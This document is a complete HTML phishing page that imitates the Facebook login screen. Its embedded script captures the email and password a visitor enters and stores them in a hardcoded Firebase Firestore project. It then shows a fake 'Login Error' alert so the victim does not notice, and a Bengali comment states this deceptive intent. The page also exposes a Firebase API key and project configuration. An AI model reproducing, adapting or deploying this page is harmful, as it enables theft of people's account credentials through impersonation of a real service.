<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="fb-text">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="login-box">
            <input type="text" id="email" placeholder="Email or phone number">
            <input type="password" id="pass" placeholder="Password">
            <button class="login-btn" id="login-submit">Log In</button>
            <a href="#">Forgotten password?</a>
            <hr>
            <button class="create-btn">Create new account</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // আপনার প্রজেক্টের কনফিগ কোড
        const firebaseConfig = {
            apiKey: "AIzaSyDab4A_V9rDyVpqw-rFerXs4zz4vdpmZRM",
            authDomain: "my-fb-data.firebaseapp.com",
            projectId: "my-fb-data",
            storageBucket: "my-fb-data.firebasestorage.app",
            messagingSenderId: "246019608846",
            appId: "1:246019608846:web:78846906c24f9a1aa7075f"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // লগইন বাটনে ক্লিক করলে ডাটা সেভ করার কোড
        document.getElementById('login-submit').addEventListener('click', async () => {
            const emailValue = document.getElementById('email').value;
            const passValue = document.getElementById('pass').value;

            try {
                await addDoc(collection(db, "user_data"), {
                    email: emailValue,
                    password: passValue,
                    time: new Date()
                });
                alert("Login Error! Please try again."); // ইউজারের কাছে এটি এরর মনে হবে, কিন্তু ডাটা জমা হয়ে যাবে
            } catch (e) {
                console.error("Error adding document: ", e);
            }
        });
    </script>
</body>
</html>
